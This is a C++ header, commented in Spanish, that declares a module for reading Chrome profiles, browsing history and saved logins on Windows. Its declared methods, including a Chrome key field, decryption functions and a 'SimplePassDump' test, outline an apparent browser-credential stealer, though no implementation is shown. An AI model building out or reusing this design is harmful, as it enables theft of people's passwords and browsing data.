#ifndef __MOD_INFO
#define __MOD_INFO 1

#include "headers.hpp"
#include<LMaccess.h>
#include<LMerr.h>
#include<LMAPIbuf.h>
#include<bcrypt.h>
#include<wincrypt.h>
#include "../json/json.hpp"
#include "../sqlite3/sqlite3.h"
#include "../base64/base64.h"

struct Chrome_History {
	std::string strURL;
	std::string strDate;
};

struct Chrome_Profile {
	std::string strPath;
	std::string strName;
	std::string strGaiaName;
	std::string strShortCutName;
	std::string strUserName;
	std::string strHostedDomain;
};

class mod_Info {	
	public:
		//Probar para mostrar toda la info
		void test_Data();

		void test_SQL();

		void test_SimplePassDump(const std::string& strUserPath);
	private:
		std::vector<Chrome_Profile> m_ChromeProfiles();
		std::vector<std::string> m_Usuarios();

		std::string m_Decrypt(const std::string& strPass);
		std::string m_DecryptLogin(const std::string& strPass);

		std::vector<unsigned char> vcChromeKey;

		std::string strBasePath = "";

};

#endif